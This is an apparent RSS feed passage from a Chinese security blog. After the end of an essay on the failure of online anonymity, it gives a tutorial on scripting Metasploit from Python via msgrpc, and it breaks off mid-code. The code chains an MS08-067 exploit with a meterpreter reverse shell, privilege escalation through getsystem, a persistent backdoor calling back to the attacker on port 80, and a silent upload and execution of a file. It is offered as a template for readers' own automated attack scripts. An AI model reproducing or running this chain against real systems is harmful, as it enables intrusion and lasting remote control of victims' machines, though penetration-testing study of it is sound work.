font-size: 14px; line-height: 28px; background-color: #f8f8f8">即使那些认为藏在Tor或者其它&ldquo;暗网&rdquo;设施中能够给自己带来一点匿名性幻觉的黑客也必须了解到警察逮捕网络犯罪者是多么神速。匿名者的中流砥柱们一个个被逮捕，在法庭上被指证，并被判了真实的刑期，有着真实的服刑代码，和他们的真实身份挂钩在一起。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">事实是，匿名工具没有用。很多公司，当然也包括执法部门，已经知道你是谁了。未来唯一不同的是，每个人都会心中有数，停止假装他们能够隐藏自己，在网上保持匿名。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">希望政府能够通过一项保障隐私的消费者权利法案，但过去的经验告诉我们，太多的公民愿意放弃隐私权，换取保护，这已经是除了互联网以外所有其它领域的准则。互联网是不是下一个，我们走着瞧~</p>
]]>
</description>
</item><item>
<link>http://i.renjihe.com/blog/read.php?6460</link>
<title><![CDATA[教你用Python玩转神器Metasploit]]></title> 
<author>renjihe1988 &lt;admin@yourname.com&gt;</author>
<category><![CDATA[网络安全]]></category>
<pubDate>Fri, 20 Mar 2015 09:54:55 +0000</pubDate> 
<guid>http://i.renjihe.com/blog/read.php?6460</guid> 
<description>
<![CDATA[ 
	<p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"><span style="box-sizing: border-box; font-weight: 700">pymsf是著名安全研究团队Spiderlabs实现的一个Python与Metasploit msgrpc进行通信的python模块，通过它，你可以利用Python玩转渗透测试框架Metasploit。</span></span></p><p style="box-sizing: border-box; margin: 15px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; font-size: 18px; color: #000000"><span style="box-sizing: border-box; font-weight: 700">使用步骤</span></span></p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"><span style="box-sizing: border-box; font-weight: 700">首先你需要先启动msgrpc服务，命令如下:</span></span></p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #48484c" class="pln">load&nbsp;msgrpc&nbsp;</span><span style="box-sizing: border-box; color: teal" class="typ">Pass</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=&lt;</span><span style="box-sizing: border-box; color: #48484c" class="pln">password</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">&gt;</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #00b050"><span style="box-sizing: border-box; font-weight: 700">与msgrpc进行通信其实就是与msfconsole进行通信，首先你需要创建一个msfrpc的类,登录到msgrpc服务器并且创建一个虚拟<br />的终端,然后你就可以在你创建的虚拟终端上面执行多个命令的字符串.你可以调用模块的方法与console.write执行命令,并且通<br />过&quot;console.read&quot;从虚拟终端上面读取输入的值.</span></span>这篇文章将演示如何使用pymsf模块并且如何开发出一个完整的脚本.</p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px">这里有一个函数它创建了一个msfrpc实例,登录到msgrpc服务器,并且创建了一个虚拟终端.</p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sploiter</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;client&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: teal" class="typ">Msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(&#123;&#125;)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">login</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'msf'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'123'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;ress&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.create'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;console_id&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;ress</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'id'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">]</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #000000"><span style="box-sizing: border-box; font-weight: 700">下一步就是实现把多个字符串发给虚拟终端,通过console.write和console.read在虚拟终端显示与读取:</span></span></p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Exploit&nbsp;MS08-067&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> commands&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/windows/smb/ms08_067_netapi set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;RHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LPORT&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;ExitOnSession&nbsp;false exploit&nbsp;-z &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Exploiting&nbsp;MS08-067&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">commands</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> res&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> result&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;res</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'data'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">].</span><span style="box-sizing: border-box; color: #48484c" class="pln">split</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'&#92;n'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"></span>上面的这一小段代码创建了一个MSF的资源文件,这样你就可以通过&quot;resoucen<br />&quot;命令去执行指定文件里面中一系列的命令。</p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px">下面我们将通过&quot;getsystem&quot;命令把这个文件的提权,建立一个后门打开80端口来转发.并且永久的运<br />行.最后上传我们的漏洞exp并且在命令模式下面悄悄的安装:</p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #93a1a1" class="com">#&nbsp;这个函数会创建一个MSF&nbsp;.rc文件</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;builder</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/smbpost.rc'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bat&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/ms08067_install.bat'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;postcomms&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;getsystem run&nbsp;persistence&nbsp;-S&nbsp;-U&nbsp;-X&nbsp;-i&nbsp;10&nbsp;-p&nbsp;80&nbsp;-r&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; cd&nbsp;c:&#92;&#92; upload&nbsp;/tmp/ms08067_patch.exe&nbsp;c:&#92;&#92; upload&nbsp;/tmp/ms08067_install.bat&nbsp;c:&#92;&#92; execute&nbsp;-f&nbsp;ms08067_install.bat &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batcomm&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;ms08067_patch.exe&nbsp;/quiet&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">postcomms</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">);</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">batcomm</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">();</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px">通过上面的那段代码,将会创建一个.rc的文件.通过msf模块&ldquo;post/multi/gather/run_console_rc_file&rdquo;在当前<br />的meterpreter会话中运行生成的文件,并且通过console.write命令从虚拟终端写入数据,通过console.read命令来回显返回内容:</p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;运行生成的exp&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> runPost&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;post/multi/gather/run_console_rc_file set&nbsp;RESOURCE&nbsp;/tmp/smbpost.rc set&nbsp;SESSION&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Running&nbsp;post-exploit&nbsp;script&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">runPost</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Setup&nbsp;Listener&nbsp;for&nbsp;presistent&nbsp;connection&nbsp;back&nbsp;over&nbsp;port&nbsp;80&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #195f91" class="lit">10</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;listen&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/multi/handler set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;LPORT&nbsp;80 set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Setting&nbsp;up&nbsp;listener&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;:80&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">listen</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> lres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;lres</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"></span>上面代码中的变量(RHOST, LHOST,<br />LPORT等)都是通过optparse模块从命令终端输入的,完整的脚本托管在github上面,有时候你需要知道脚本的生成的地方都是静态地址,不会<br />在其他的目录生成,例如ms08067的补丁就会在你的/tmp/目录下面。<span style="box-sizing: border-box; color: #262626"></span></p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; font-weight: 700">大家只要知道基础然后对下面的代码进行一定的修改就可以编程一个属于你自己的<br />msf自动化攻击脚本,我们建议通过博客里面发表的一些简单的例子出发,然后自己写一个msf攻击脚本:</span></p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #1e347b" class="kwd">import</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;os</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;optparse</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sys</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;subprocess </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">from</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;time&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">import</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sleep&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">#&nbsp;Function&nbsp;to&nbsp;create&nbsp;the&nbsp;MSF&nbsp;.rc&nbsp;files</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;builder</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/smbpost.rc'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bat&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/ms08067_install.bat'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;postcomms&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;getsystem run&nbsp;persistence&nbsp;-S&nbsp;-U&nbsp;-X&nbsp;-i&nbsp;10&nbsp;-p&nbsp;80&nbsp;-r&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; cd&nbsp;c:&#92;&#92; upload&nbsp;/tmp/ms08067_patch.exe&nbsp;c:&#92;&#92; 